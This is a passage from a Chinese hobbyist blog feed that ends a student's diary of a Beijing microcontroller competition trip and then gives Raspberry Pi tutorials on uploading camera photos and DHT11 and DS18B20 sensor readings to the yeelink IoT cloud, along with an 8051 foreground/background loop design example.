<p>　　中午带队老师带我们去吃了自助，到北京的第一顿饭，吃的很饱也很爽。下午休息了一下就到北方工业大学去看考场了，在百度地图的指引下一路公交到达考点花了将近两个小时，确实有点远，计划第二天早上要很早起来，然后坐地铁过去，毕竟怕迟到。北方工业大学博远楼是新建不久的大楼，里面的设备都很好，大教室有100堕胎电脑，好几个大的显示屏，很是羡慕，毕竟帝都的学校啊，比我们的条件真的好很多。到赛场熟悉了比赛要使用的电脑之后我们便赶回宾馆与带队老师汇合。吃过晚饭后去了北大，虽然晚上不太看得清，但是还是有几点很不一样的感受，第一是北大的自行车特别多，几乎所有教学楼旁边都停满了自行车，然而在我们学校这样的场景是看不到的，这或许也是一种氛围吧，快节奏的校园生活。第二是课堂氛围好，观察了课堂最后几排的同学，基本没有在玩手机的，都在认真听讲，这和我们学校也是天然之别。第三是北大学生的气质都不一样，特别是女生，有一种肃然起敬的感觉。在未名湖畔，听带队老师给我们介绍北大，也是很不错的经历了。晚上回到宾馆已经10点，突然发现奔波了一天，感觉很累了，但是想到明天的比赛还剩很紧张，本来来北京之前准备了一些资料，准备在火车上或者到宾馆再认真看看，但是一直没有机会。现在终于可以再好好准备一下明天的比赛了，于是又和队友一起认真的写代码，记代码，熟悉自己还不熟练的模块，差不多到12点，累得不行了，就休息了。</p>
<p>　　5月28日早，因为住的地方离考点：北方工业大学有点远，坐地铁转公交加起来差不多要一个小时，所以我们早早的就出发了，到那里时后到处找卖早餐的地方，很是着急，匆匆吃完早餐就去考场了。一进大楼就有武警保守，突然觉得有点紧张了，排队进场然后抽取座位号，40号，说实话，不太喜欢的一个数字，但是当时也没想太多。找到座位后，我发现很多人已经开始在写代码了，于是我也里面开始建工程，把基本的代码框架搭好，等到老师发布题目时我已经能够让数码管显示数字了，这一点很重要，争取了一点点时间。然后，突然被告知这个机房的Altium Designer由于没有破解，很多电脑都用不了，所以只能用protel99 se，但是我从来都没用过，所以我当时就很慌了，打开protel 99后发现是英文版的，我连元器件都找不到！琢磨了几分钟后我放弃了，决定先把题目要求的功能实现，毕竟电路图只有十分。这次的题目相比省赛的题目难多了，时间一样，但是要求更多，逻辑更复杂。折腾了好一会，遇到不少的问题，发现原本熟悉的矩阵键盘也不灵了，最后赛点老师提示大家由于题目要测555产生的波的频率和周期，占用了P3.4口，所以会影响矩阵键盘，希望大家明白这不是板子的问题，我突然明白了，然后开始根据题目需求改矩阵键盘的检测代码。写着写着，又发现竞赛给的驱动代码也有问题，这个问题是我们在准备省赛的时候就发现了的，当时认真的解决了这个问题，但是我始终坚信竞赛的时候给的驱动代码是不会有问题的，于是决赛的备赛阶段我就没怎么注意这个问题。AD得到的数据一直在跳，到最后也没有稳定下来，但是AD是可以用的。后来发现时间越来越紧了，也是决定改变策略，把思路理清，把基本的界面和功能先实现，更深入的要求如果没时间就不做了。</p>
<p>　　5月28日下午，比赛就这样结束了，或许一切结束的太快，突然觉得如释重负，又觉得这次要拿奖很悬。仔细想了想，反正明天就出结果，今天得好好玩一玩，然后直接去了天安门城楼。公交转地铁，一路都很顺利，不得不感慨帝都的路面交通经常很堵，但是地铁真的是很方便。天安门城楼和天安门广场到处都有安保，进入天安门区域还有安检。以前只能在电视里看到的地方，现在自己终于有机会亲临现场感受祖国的伟大。4点过3分到达故宫售票点，却发现4点后不再售票，这也许是这次北京之行的一大遗憾了吧。看了中山公园、天安门广场、人民英雄纪念碑、人民大会堂、毛主席纪念堂等，具体的就不在这里一一描述了，感觉已经有点记流水账了。</p>
<p>　　5月28日晚上，先描述一下行程吧，因为指导老师以前的几个学生在北京工作，听说老师来北京了，特意来请老师吃饭，顺便把我们也带上了，吃完还带我们到鸟巢、水立方、奥林匹克森林公园附近转了转。然后谈谈感想，我是觉得很有幸能够见到几位07级的学长，几位学长以前是农大的，考了北邮、北航这样的学校的研究生，他们现在在阿里、360、百度这样的公司工作，以前都是从实验室出来的，他们都觉得是实验室的老师教会了他们很多，也是在实验室他们得到了很多锻炼。其中有一位学长本科是学经济学的，因为兴趣加入了我们院的ACM实验室，后来考上了北邮的研究生，现在在阿里做搜索方面的工作，这让我很佩服，然后我去看了他的博客，他从11年开始写，一直到现在都还有更新。与几位学长交流了很多，了解到360竟然有专门的爬虫部门，在阿里的学长说我们在大学能够做一个不错的搜索引擎项目就很不错了。交流之中，我也明白了做技术确定比较辛苦，坚持去做一件事情也确实不容易，但是如果能深入下去还是会找到不一样的快乐。</p>
<p>　　5月29日，长城一日游，也是一次充满故事的旅行吧！未完待续，有时间继续更新继续修改。</p>
<p>　　因为是第一次去北京，所以本来就很特殊。</p>
<p>　　特殊到我可以开心好久好久！</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派 + USB 摄像头 + yeelink 实现云监控</title>
    <url>/2016/06/10/%E6%A0%91%E8%8E%93%E6%B4%BE%20+%20USB%20%E6%91%84%E5%83%8F%E5%A4%B4%20+%20yeelink%20%E5%AE%9E%E7%8E%B0%E4%BA%91%E7%9B%91%E6%8E%A7/</url>
    <content><![CDATA[<h4 id="配置USB摄像头"><a href="#配置USB摄像头" class="headerlink" title="配置USB摄像头"></a>配置USB摄像头</h4><h5 id="检查摄像头"><a href="#检查摄像头" class="headerlink" title="检查摄像头"></a>检查摄像头</h5><p>　　检查摄像头是否被树莓派检测到，输入命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> lsusb</span></div></pre></td></tr></table></figure>
<a id="more"></a>
<h5 id="查看输出信息"><a href="#查看输出信息" class="headerlink" title="查看输出信息"></a>查看输出信息</h5><p> <img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/10-1.jpg" alt="10-1"></p>
<p>　　如上图我们可以看到 camera 的信息，如果没有你的摄像头的信息，那么有可能你的树莓派的电源无法供应足够的电力给你的摄像头。这时你可以给你的摄像头用独立的电源线，比如有源 USB hub，并重新输入 lsusb 命令查看。如果摄像头还是不能被识别，我们只有建议你购买其他树莓派支持的摄像头了。</p>
<h5 id="安装fswebcam"><a href="#安装fswebcam" class="headerlink" title="安装fswebcam"></a>安装fswebcam</h5><p>　　要想拍摄照片，你要安装 fswebcam，这是一款小型摄像头程序。你可以直接通过 Raspbian 的仓库来安装 fswebcam。输入命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install fswebcam</span></div></pre></td></tr></table></figure>
<h4 id="配置yeelink云端"><a href="#配置yeelink云端" class="headerlink" title="配置yeelink云端"></a>配置yeelink云端</h4><ul>
<li><p>到 <a href="http://www.yeelink.net/" target="_blank" rel="external">yeelink官网</a> 注册一个账号。</p>
</li>
<li><p>添加一个新设备,填写基本信息。<br><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/10-2.jpg" alt="10-2"></p>
</li>
<li><p>点击管理设备，然后添加一个传感器。<br><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/10-3.jpg" alt="10-3"></p>
</li>
<li><p>查看API文档。<br><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/10-4.jpg" alt="10-4"><br><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/10-6.jpg" alt="10-5"></p>
</li>
</ul>
<h4 id="配置shell脚本"><a href="#配置shell脚本" class="headerlink" title="配置shell脚本"></a>配置shell脚本</h4><ul>
<li><p>创建 shell 脚本。输入命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> touch yeelink.sh</span></div></pre></td></tr></table></figure>
</li>
<li><p>打开 yeelink.sh。输入命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> nano yeelink.sh</span></div></pre></td></tr></table></figure>
</li>
<li><p>编辑 yeelink.sh。写入如下两行，然后保存退出：</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">sudo fswebcam -d /dev/video0 -r 800x600 --bottom-banner --title "RaspberryPi@Yeelink" --save /home/pi/yeelink.jpg</div><div class="line">curl --request POST --data-binary  @"/home/pi/yeelink.jpg" --header "U-ApiKey:这里填写你自己的ApiKey" http://api.yeelink.net/v1.0/device/你的设备码/sensor/你的传感器码/photos</div></pre></td></tr></table></figure>
<ul>
<li>为脚本增加可执行权限。输入命令：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> chmod +x yeelink.sh</span></div></pre></td></tr></table></figure>
<ul>
<li>将脚本加入 cronjob 定时任务。输入命令：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> crontab -e</span></div></pre></td></tr></table></figure>
<ul>
<li>加入下面一行, 让脚本每分钟运行一次,即发送一张图片，然后保存退出</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">*/1 * * * * /home/pi/yeelink.sh</div></pre></td></tr></table></figure>
<p>　　至此，我们的项目就完成了，我们可以到 yeelink 网站上去管理我们的设备，可以看到每隔一分钟会收到一张图片。如下图是我测试时的图片：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/10-5.jpg" alt="10-5"></p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>yeelink</tag>
        <tag>Raspberry Pi</tag>
      </tags>
  </entry>
  <entry>
    <title>单片机设计与开发：前后台系统</title>
    <url>/2016/06/03/%E5%8D%95%E7%89%87%E6%9C%BA%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BC%80%E5%8F%91%EF%BC%9A%E5%89%8D%E5%90%8E%E5%8F%B0%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<p>　　前后台系统的架构简单来说就是一个大的循环，加上中断，就形成了一个整的体系。如 GPIO、定时器、数码管实验等都是前后台系统架构，任务顺序地执行的，而前台指的是中断级，后台指的是 main 函数里的程序即任务级。</p>
<a id="more"></a>
<p>　　前后台系统又叫作超级大循环系统，这个可以从 <code>while(1)</code> 关键字眼就可以得知。这样的系统比较简单，实时性，并行性要求不太高的情况下是不错的方法，程序设计简单，思路比较清晰。但是当应用程序比较复杂的时候，如果没有一个完整的流程图，恐怕别人很难看懂程序的运行状态，而且随着程序功能的增加，编写应用程序的工程师的大脑也开始混乱。即不利于升级维护，也不利于代码优化。比较复杂一点的应用程序，使用此法虽然能够实现功能，但是自己的思维一直处于混乱状态，导致程序一直不能让自己满意。</p>
<p>　　这里通过一个简单的例子来说明前后台系统设计的思想，相信很多人平常也这么用过，但是可能并不知道这就是前后台系统的思想。很简单，我们通过单片机来实现一个温度采集并将温度显示在数码管上的小实验。在这里数码管显示就相当于前台，所以 <code>display()</code> 函数放在中断服务函数里，是它能够 2ms 更新一次数据，然后在主函数通过 <code>while(1)</code> 循环实现后台任务，即温度采集与数据处理，最终实现温度实时更新。代码框架如下：<br>​<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span>     <span class="comment">//数码管显示函数</span></span></div><div class="line">&#123;</div><div class="line">    ........       <span class="comment">//段选</span></div><div class="line">    ........       <span class="comment">//位选</span></div><div class="line">    ........       <span class="comment">//消影</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_timer</span><span class="params">()</span>     <span class="comment">//定时器0初始化</span></span></div><div class="line">&#123;</div><div class="line">    TMOD = <span class="number">0x01</span>;</div><div class="line">    TH0 = (<span class="number">65536</span><span class="number">-2000</span>)/<span class="number">256</span>;</div><div class="line">    TL0 = (<span class="number">65536</span><span class="number">-2000</span>)%<span class="number">256</span>;</div><div class="line">    EA = <span class="number">1</span>;</div><div class="line">    ET0 = <span class="number">1</span>;</div><div class="line">    TR0 = <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;   </div><div class="line">    uint temp;</div><div class="line">    uchar adc,num;</div><div class="line">    init_timer();     <span class="comment">//定时器初始化</span></div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        ......     <span class="comment">//温度采集</span></div><div class="line">        ......     <span class="comment">//数据处理</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">timer</span><span class="params">()</span> interrupt 1     <span class="comment">//定时器0中断服务函数</span></span></div><div class="line">&#123;</div><div class="line">    TH0 = (<span class="number">65536</span><span class="number">-2000</span>)/<span class="number">256</span>;</div><div class="line">    TL0 = (<span class="number">65536</span><span class="number">-2000</span>)%<span class="number">256</span>;</div><div class="line">    display();     <span class="comment">//每2ms显示一次</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>　　当然，前后台系统设计一定要注意一条原则：</p>
<p>　　<strong>紧急的事务一定要用中断处理，中断只处理紧急事务！</strong></p>
<p>　　在前后台系统当中，关键的时间操作必须通过中断操作来保证实时性，由于前后台系统中的任务是顺序执行的，中断服务函数提供的信息需要后台程序走到该处理这个信息这一步时才能得到处理的，倘若任务数越多，实时性更加得不到保证，因为循环的执行时间不是常数，程序经过某一特定部分的准确时间也是不能确定的。进而，如果程序修改了，循环的时序也会受到影响。很多基于微处理器的产品采用前后台系统设计，例如微波炉、电话机、玩具等。在另外一些基于微处理器的应用中，从省电的角度出发，平时微处理器处在停机状态(halt)，所有的事都靠中断服务来完成。</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Embedded system</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派 + DHT11 温湿度传感器 + yeelink 物联网云</title>
    <url>/2016/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%20+%20DHT11%20%E6%B8%A9%E6%B9%BF%E5%BA%A6%E4%BC%A0%E6%84%9F%E5%99%A8%20+%20yeelink%20%E7%89%A9%E8%81%94%E7%BD%91%E4%BA%91/</url>
    <content><![CDATA[<h4 id="配置准备"><a href="#配置准备" class="headerlink" title="配置准备"></a>配置准备</h4><h5 id="DHT11简介"><a href="#DHT11简介" class="headerlink" title="DHT11简介"></a>DHT11简介</h5><p>　　DHT11 是一款有已校准数字信号输出的温湿度传感器。 精度湿度 +-5%RH， 温度 +-2℃，量程湿度 20-90%RH， 温度 0~50℃。</p>
<a id="more"></a>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/2-1.jpg" alt="2-1"></p>
<p>　　DHT11有四个引脚，分别是VCC，DATA，NC，GND</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/2-2.jpg" alt="2-2"></p>
<h5 id="电路连接"><a href="#电路连接" class="headerlink" title="电路连接"></a>电路连接</h5><p>　　本博文中 Python 程序使用的是 BCM 编号方式，17 号即 pin11 接 DHT11 的 DATA，VCC 接 3.3V，NC 悬空，GND 接 0V，可通过下图找到对应引脚，进行连线。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/2-3.jpg" alt="2-3"></p>
<h4 id="获取温湿度数据"><a href="#获取温湿度数据" class="headerlink" title="获取温湿度数据"></a>获取温湿度数据</h4><p>　　关于 DHT11 具体的时序，以及如何操作，在我的博客：<a href="https://blog.csdn.net/u013151320/article/details/50389624" target="_blank" rel="external">51单片机DHT11温湿度传感器</a> 中有详细分析，有兴趣可以去了解一下，以便你可以看懂下面的 Python 程序。<br><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> RPi.GPIO <span class="keyword">as</span> GPIO</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="comment">#BCM编号方式的17对应树莓派的pin11</span></div><div class="line">channel = <span class="number">17</span></div><div class="line">data = []</div><div class="line">j = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="comment">#I/O口使用BCM编号方式</span></div><div class="line">GPIO.setmode(GPIO.BCM)</div><div class="line"></div><div class="line">time.sleep(<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="comment">#设置数据线为输出</span></div><div class="line">GPIO.setup(channel, GPIO.OUT)</div><div class="line"></div><div class="line">GPIO.output(channel, GPIO.LOW)</div><div class="line">time.sleep(<span class="number">0.02</span>)</div><div class="line">GPIO.output(channel, GPIO.HIGH)</div><div class="line"></div><div class="line"><span class="comment">#设置数据线为输入</span></div><div class="line">GPIO.setup(channel, GPIO.IN)</div><div class="line"></div><div class="line"><span class="keyword">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class="line">     <span class="keyword">continue</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class="line">     <span class="keyword">continue</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> j &lt; <span class="number">40</span>:</div><div class="line">     k = <span class="number">0</span></div><div class="line">     <span class="keyword">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class="line">         <span class="keyword">continue</span></div><div class="line"></div><div class="line">     <span class="keyword">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class="line">         k += <span class="number">1</span></div><div class="line">         <span class="keyword">if</span> k &gt; <span class="number">100</span>:</div><div class="line">             <span class="keyword">break</span></div><div class="line"></div><div class="line">     <span class="keyword">if</span> k &lt; <span class="number">8</span>:</div><div class="line">         data.append(<span class="number">0</span>)</div><div class="line">     <span class="keyword">else</span>:</div><div class="line">         data.append(<span class="number">1</span>)</div><div class="line"></div><div class="line">     j += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"sensor is working."</span></div><div class="line"><span class="keyword">print</span> data</div><div class="line"></div><div class="line"><span class="comment">#读取数值</span></div><div class="line">humidity_bit = data[<span class="number">0</span>:<span class="number">8</span>]</div><div class="line">humidity_point_bit = data[<span class="number">8</span>:<span class="number">16</span>]</div><div class="line">temperature_bit = data[<span class="number">16</span>:<span class="number">24</span>]</div><div class="line">temperature_point_bit = data[<span class="number">24</span>:<span class="number">32</span>]</div><div class="line">check_bit = data[<span class="number">32</span>:<span class="number">40</span>]</div><div class="line"></div><div class="line">humidity = <span class="number">0</span></div><div class="line">humidity_point = <span class="number">0</span></div><div class="line">temperature = <span class="number">0</span></div><div class="line">temperature_point = <span class="number">0</span></div><div class="line">check = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="comment">#转换数值</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">     humidity += humidity_bit[i] * <span class="number">2</span> ** (<span class="number">7</span> - i)</div><div class="line">     humidity_point += humidity_point_bit[i] * <span class="number">2</span> ** (<span class="number">7</span> - i)</div><div class="line">     temperature += temperature_bit[i] * <span class="number">2</span> ** (<span class="number">7</span> - i)</div><div class="line">     temperature_point += temperature_point_bit[i] * <span class="number">2</span> ** (<span class="number">7</span> - i)</div><div class="line">     check += check_bit[i] * <span class="number">2</span> ** (<span class="number">7</span> - i)</div><div class="line"></div><div class="line">tmp = humidity + humidity_point + temperature + temperature_point</div><div class="line"></div><div class="line"><span class="comment">#数据校验</span></div><div class="line"><span class="keyword">if</span> check == tmp:</div><div class="line">     <span class="keyword">print</span> <span class="string">"temperature : "</span>, temperature, <span class="string">", humidity : "</span> , humidity</div><div class="line"><span class="keyword">else</span>:</div><div class="line">     <span class="keyword">print</span> <span class="string">"wrong"</span></div><div class="line">     <span class="keyword">print</span> <span class="string">"temperature : "</span>, temperature, <span class="string">", humidity : "</span> , humidity, <span class="string">" check : "</span>, check, <span class="string">" tmp : "</span>, tmp</div><div class="line"></div><div class="line">GPIO.cleanup()</div></pre></td></tr></table></figure></p>
<p>在python文件的路径下输入命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">sudo python ./dht11.py</div></pre></td></tr></table></figure>
<p>即可获得数据，效果如图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/2-4.jpg" alt="2-4"></p>
<p>　　可以看到，当校验不正确时会打印出 “wrong”，表示数据错误，在读取一次得到正常的数据。</p>
<h4 id="上传数据到yeelink"><a href="#上传数据到yeelink" class="headerlink" title="上传数据到yeelink"></a>上传数据到yeelink</h4><h5 id="修改python代码"><a href="#修改python代码" class="headerlink" title="修改python代码"></a>修改python代码</h5><p>　　在上面的代码后添加如下代码，即将温度和湿度数据保存到 txt 文件里：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#数据转换成JSON格式</span></div><div class="line">mytemp = <span class="string">'&#123;"value":%f&#125;'</span> %temperature</div><div class="line">myhumi = <span class="string">'&#123;"value":%f&#125;'</span> %humidity</div><div class="line"></div><div class="line"><span class="comment">#打开文件</span></div><div class="line">tmp_output = open(<span class="string">'/home/pi/mytest/DHT11/tmp_data.txt'</span>, <span class="string">'w'</span>)</div><div class="line">hud_output = open(<span class="string">'/home/pi/mytest/DHT11/hud_data.txt'</span>, <span class="string">'w'</span>)</div><div class="line"></div><div class="line"><span class="comment">#写数据到文本文件中</span></div><div class="line">tmp_output.write(mytemp)</div><div class="line">hud_output.write(myhumi)</div><div class="line"></div><div class="line"><span class="comment">#关闭文件</span></div><div class="line">tmp_output.close</div><div class="line">hud_output.close</div></pre></td></tr></table></figure>
<h5 id="yeelink-sh脚本"><a href="#yeelink-sh脚本" class="headerlink" title="yeelink.sh脚本"></a>yeelink.sh脚本</h5><p>　　yeelink 是一个开源的硬件数据平台，我喜欢把它定义为一个物联网云平台，因为它给我们提供了API接口，我们可以把数据发送到云平台保存起来，也可以随时查看，真的很棒。具体的操作可以查看博主的博客：<a href="http://fanzhenyu.me/2016/06/10/%E6%A0%91%E8%8E%93%E6%B4%BE-USB%E6%91%84%E5%83%8F%E5%A4%B4-yeelink%E5%AE%9E%E7%8E%B0%E4%BA%91%E7%9B%91%E6%8E%A7/" target="_blank" rel="external">树莓派+USB摄像头+yeelink实现云监控</a>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">sudo python /home/pi/mytest/DHT11/dht11.py</div><div class="line">curl --request POST --data-binary @"/home/pi/mytest/DHT11/tmp_data.txt" --header "U-ApiKey:XXXXXXXXXXXXXXXX" http://api.yeelink.net/v1.0/device/设备号/sensor/传感器号/datapoints</div><div class="line">sleep 10s</div><div class="line">curl --request POST --data-binary @"/home/pi/mytest/DHT11/hud_data.txt" --header "U-ApiKey:XXXXXXXXXXXXXXXX" http://api.yeelink.net/v1.0/device/设备号/sensor/传感器号/datapoints</div></pre></td></tr></table></figure>
<p>　　<code>/home/pi/mytest/DHT11/tmp_data.txt</code> 是需要上传到 yeelink 上的文件的路径，将 <code>XXXXXXXXXXXXXXXX</code> 替换为自已账户的 API Key，后面的 URL 也需要替换为自己申请的传感器 URL。</p>
<p>　　注意：因为 DHT11 可以获得温度和湿度两种值，所以我在 yeelink 添加了两个传感器，便于观察，在这里有两次上传数据，分别是把储存温度值得 txt 文本和储存湿度值得 txt 文本通过 HTTP 协议上传到云端。</p>
<h5 id="增加可执行权限"><a href="#增加可执行权限" class="headerlink" title="增加可执行权限"></a>增加可执行权限</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">sudo chmod +x yeelink.sh</div></pre></td></tr></table></figure>
<h5 id="加入cronjob定时任务"><a href="#加入cronjob定时任务" class="headerlink" title="加入cronjob定时任务"></a>加入cronjob定时任务</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">sudo crontab -e</div></pre></td></tr></table></figure>
<h5 id="脚本自动运行"><a href="#脚本自动运行" class="headerlink" title="脚本自动运行"></a>脚本自动运行</h5><p>加入下面一行, 让脚本每1分钟运行一次，即每1分钟上传一次数据，然后保存退出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">*/1 * * * * /home/pi/mytest/yeelink.sh</div></pre></td></tr></table></figure>
<p>　　注：我给自己的实验新建了几个文件夹，路径如下：<code>/home/pi/mytest/DHT11/</code>，很多操作都是在这个路径下完成的。</p>
<p>实验效果：</p>
<p>温度：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/2-5.jpg" alt="2-5"></p>
<p>湿度：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/2-6.jpg" alt="2-6"></p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>yeelink</tag>
        <tag>Raspberry Pi</tag>
        <tag>DHT11</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派 + DS18B20 温度传感器 + yeelink 物联网云</title>
    <url>/2016/05/30/%E6%A0%91%E8%8E%93%E6%B4%BE%20+%20DS18B20%E6%B8%A9%E5%BA%A6%E4%BC%A0%E6%84%9F%E5%99%A8%20+%20yeelink%E7%89%A9%E8%81%94%E7%BD%91%E4%BA%91/</url>
    <content><![CDATA[<p>　　本博文参考了网络上多篇树莓派操作 DS18B20 的博文，经过博主亲自实践，列出了详细的步骤，通过树莓派的单总线驱动来驱动 DS18B20 获取温度数据，并通过 python 读取温度值，上传到 yeelink 物联网云平台。</p>
<a id="more"></a>
<h4 id="配置准备"><a href="#配置准备" class="headerlink" title="配置准备"></a>配置准备</h4><h5 id="电路连接"><a href="#电路连接" class="headerlink" title="电路连接"></a>电路连接</h5><p>　　DS18B20 有三个引脚：VCC，DQ，GND。其中 VCC 和 DQ 之间需接一个4K7的电阻，VCC 接树莓派的3V3（pin1），DQ 接 GPIO4（pin7）,GND 接 GND（pin6）</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/5/30-1.jpg" alt="30-1"></p>
<h5 id="升级内核"><a href="#升级内核" class="headerlink" title="升级内核"></a>升级内核</h5><p>　　首先升级内核（如果系统版本较新，可跳过这一步。升级内核可能需要很长的时间）。<br><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get upgrade</span></div></pre></td></tr></table></figure></p>
<h5 id="加载单总线驱动"><a href="#加载单总线驱动" class="headerlink" title="加载单总线驱动"></a>加载单总线驱动</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo modprobe w1-gpio</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo modprobe w1-therm</span></div></pre></td></tr></table></figure>
<p>　　<strong>注意：系统升级后，有可能gpio读不了w1</strong></p>
<p><strong>解决办法：</strong></p>
<p>　　打开 /boot/config.txt ：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /boot</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo nano config.txt</span></div></pre></td></tr></table></figure>
<p>　　在最后一行手动添加这一行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">dtoverlay=w1-gpio-pullup,gpiopin=4</div></pre></td></tr></table></figure>
<p>　　然后保存退出，重启树莓派，再把 DS18B20 接上，再次加载驱动即可。</p>
<h5 id="查看设备是否工作"><a href="#查看设备是否工作" class="headerlink" title="查看设备是否工作"></a>查看设备是否工作</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /sys/bus/w1/devices/</span></div><div class="line"><span class="meta">$</span><span class="bash"> ls</span></div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/5/30-2.jpg" alt="30-2"></p>
<p>　　28-0000075a0d1c 即为我使用的 DS18B20 的设备号</p>
<h5 id="查看当前温度值"><a href="#查看当前温度值" class="headerlink" title="查看当前温度值"></a>查看当前温度值</h5><p>　　进入到我的 DSI8B20，使用命令查看数据</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> 28-0000075a0d1c</span></div><div class="line"><span class="meta">$</span><span class="bash"> cat w1_slave</span></div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/5/30-3.jpg" alt="30-3"></p>
<p>　　第二行的 t=18437 就是当前的温度值，要换算成摄氏度，除以1000，即当前温度为 18437/1000=18.437 摄氏度。</p>
<h4 id="python读取温度值"><a href="#python读取温度值" class="headerlink" title="python读取温度值"></a>python读取温度值</h4><h5 id="新建文件"><a href="#新建文件" class="headerlink" title="新建文件"></a>新建文件</h5><p>　　在 /home/pi/ 目录下新建文件夹 mytest，并在 mytest 下新建 temp.py</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> mkdir mytest</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> mytest</span></div><div class="line"><span class="meta">$</span><span class="bash"> touch temp.py</span></div></pre></td></tr></table></figure>
<h5 id="编辑temp-py"><a href="#编辑temp-py" class="headerlink" title="编辑temp.py"></a>编辑temp.py</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> nano temp.py</span></div></pre></td></tr></table></figure>
